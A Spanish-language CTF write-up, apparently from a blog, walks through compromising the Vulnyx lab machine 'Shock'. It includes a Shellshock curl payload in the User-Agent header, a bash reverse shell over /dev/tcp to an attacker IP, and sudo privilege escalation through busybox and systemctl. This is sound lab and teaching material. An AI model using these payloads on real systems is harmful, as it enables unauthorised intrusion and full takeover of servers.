---
layout      : post
title       : "Shock - Vulnyx"
author      : elc4br4
image       : /assets/images/VULNYX/Shock-Vulnyx/Shock.jpg
optimized_image : /assets/images/VULNYX/Shock-Vulnyx/Shock.jpg
category    : [ Vulnyx ]
tags        : [ Linux ]
description : 👻En esta ocasión romperemos una máquina Linux de nivel easy de la nueva plataforma Vulnyx. Explotaremos la vulnerabilidad Shellshock y escalaremos usando dos binarios👻.
---

👻Estamos ante una máquina Linux Easy de la nueva plataforma VulNyx en la que tenemos máquinas basadas en UNIX con diferentes niveles de dificultad para aprender y practicar las habilidades de Ciberseguridad👻.

**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Explotación](#explotación).
4. [Escalada de Privilegios](#privesc). 

# Reconocimiento [#](reconocimiento) {#reconocimiento}

Como en todo CTF comenzamos enumerando puertos en la máquina víctima, esto lo hacemos usando nmap, aunque esta vez voy a usar la herramienta rustscan.

Lanzo la herramienta con el rango de puertos del 1 al 65535 para que escanee todos los puertos existentes.

![](/assets/images/VULNYX/Shock-Vulnyx/rustcan.webp)

Como podemos ver tenemos dos puertos abiertos, el puerto 22 y el puerto 80.

Si lanzamos un escaneo un poco más avanzado para descubrir qué servicios corren en cada puerto podremos ver lo siguiente.

```r
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSRcer8jyQvBQLNodMY/8sZbjcip1NPmoJkdQZV/Ngm/cXzaUR06OCNKyJM8Blve6Pi86npcZPIs5iuowUH2eTDGRPoH9EbJCbeDRrGyy+CTrdLci3VEmFV8K0rhoYA3nzCPR59CKVdW58OIEMZoJiTzX/I/dH9Mp1XLSLghkirI2YiGJBUhxLyc+03LOTAu/kHC7F1d10/XQjmuspHkfX2PvJsIhzoaKXyo2+CFZNuWkY0/gs+FN9KPdtkMnyv9/+fGn06cYBu/dw7OE9OOcdl2jZUXVT/bEfjK1nNmjp3dAKqOO3iVpciGjCFBgQWvkjakOEpvfd2wAYQHOe9pL7
|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP/FWnKmPLA1LACd7NDtXVGKDHXYkZmtzC8zhOGcpSD6nnbvhdo4CU4ZoLMAPQfc2Ww6qNCKY9LkmeegGyZBeoM=
|   256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2ClztzZ1xvNlcuG7c24bOcE/UKY3EBFH8Edpcy03vw
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión |
| ------ | -------- | ------- |
| 22     | SSH      | OpenSSH 7.9p1 Debian |
| 80     | HTTP     | Apache httpd 2.4.38 |

Tras ver que tenemos solo estos dos puertos abiertos procedo a enumerar un poco el servidor web Apache.

Accedo con el navegador para ver que encontramos de primeras y echar una pequeña ojeada inicial.

![](/assets/images/VULNYX/Shock-Vulnyx/web1.webp)

Aparente no hay nada de interés, en el código fuente tampoco, por lo que me pongo a fuzzear para buscar rutas o archivos en el servidor.

Para ello usaré la herramienta gobuster, aunque existen muchas más con las que se puede realizar el fuzzing.

![](/assets/images/VULNYX/Shock-Vulnyx/fuzzing1.webp)

Podemos ver que existe el directorio cgi-bin, y eso me hace pensar que podríamos estar ante la vulnerabilidad ShellShock, y viendo el nombre de la máquina... es lo más probable.

Sigo fuzzeando desde la ruta /cgi-bin para descubrir más directorios o archivos dentro de la misma.

Los archivos susceptibles a un ataque Shellshock son los que comúnmente pertenezcan a alguna de las siguientes extensiones, tales como cgi y sh.

Tras fuzzear encuentro un archivo llamado `shell.sh` lo que ya me va haciendo confirmar que es muy probable que estemos ante ShellShock.

![](/assets/images/VULNYX/Shock-Vulnyx/fuzzing2.webp)

Pero antes nada primero vamos a ver que es ShellShock y en que consiste.

## ¿Qué es la vulnerabilidad ShellShock y en qué consiste?

ShellShock es una vulnerabilidad asociada al CVE-2014-6271 que afecta a la shell de Linux "bash" hasta la versión 4.3.
A través de esta vulnerabilidad podemos ejecutar comandos de forma remota.

Se origina porque bash permite declarar funciones, pero no se validan de forma correcta cuando se almacenan en una variable.

# Explotación [#](explotación) {#explotación}

Ahora que ya sabemos más o menos que es esta vulnerabilidad y como se origina, toca explotarla.

Primero vamos a verificar que de verdad estamos ante ShellShock y es vulnerable al mismo.

```bash
curl -H ‘User-Agent: () { :;}; echo; echo ¿Vulnerable a ShellShock?’ ‘http://192.168.0.19/cgi-bin/shell.sh’
```

![](/assets/images/VULNYX/Shock-Vulnyx/shellshock1.webp)

Y como podemos ver ejecuta correctamente el comando `echo ¿Vulnerable a ShellShock?`.

Por lo que el siguiente paso será introducir una reverse shell en bash para intentar ganar acceso a la máquina víctima.

Ponemos netcat en escucha en el puerto 443

`nc -lnvp 443`

Y le metemos una reverse shell bash para ganar acceso.

```bash
curl -H ‘User-Agent: () { :;}; echo; bash -i >& /dev/tcp/192.168.0.30/443 0>&1’ ‘http://192.168.0.19/cgi-bin/shell.sh’
```

Y obtenemos acceso a la máquina como el usuario www-data.

![](/assets/images/VULNYX/Shock-Vulnyx/reverse-shell.webp)

# Escalada de Privilegios [#](privesc) {#privesc}

Tras ganar acceso comienzo a ojear un poco y veo que tenemos el directorio del usuario will, pero no tenemos permisos, por lo que lo primero será intentar migrarnos a este usuario.

# Movimiento Lateral - Usuario will

Ejecuto el comando `sudo -l` para enumerar permisos de sudo y veo que puedo ejecutar el binario busybox como el usuario will sin contraseña.

![](/assets/images/VULNYX/Shock-Vulnyx/busybox.webp)

Y siempre que hablamos de binarios... hablamos de GTFOBINS  

https://gtfobins.github.io/

![](/assets/images/VULNYX/Shock-Vulnyx/busybox-gtfo.webp)

Ejecutamos el siguiente comando:

`sudo -u will /usr/bin/busybox sh`

![](/assets/images/VULNYX/Shock-Vulnyx/will.webp)

Y ya nos hemos migrado al usuario Will y podemos leer la flag user.

El siguiente paso obviamente es escalar privilegios para convertirnos en root.

# Escalada de Privilegios

Para escalar privilegios de nuevo vuelvo a ejecutar el comando `sudo -l` para enumerar permisos sudo y veo que puedo ejecutar el binario systemctl como root sin contraseña.

Por lo que este paso es igual que el anterior, nos dirigimos a gtfobins.

![](/assets/images/VULNYX/Shock-Vulnyx/systemctl-gtfobins.webp)

![](/assets/images/VULNYX/Shock-Vulnyx/systemctl.webp)

Ejecutamos lo siguiente:

```bash
sudo /usr/bin/systemctl
!sh
```

![](/assets/images/VULNYX/Shock-Vulnyx/root.webp)

Y ya somos root.








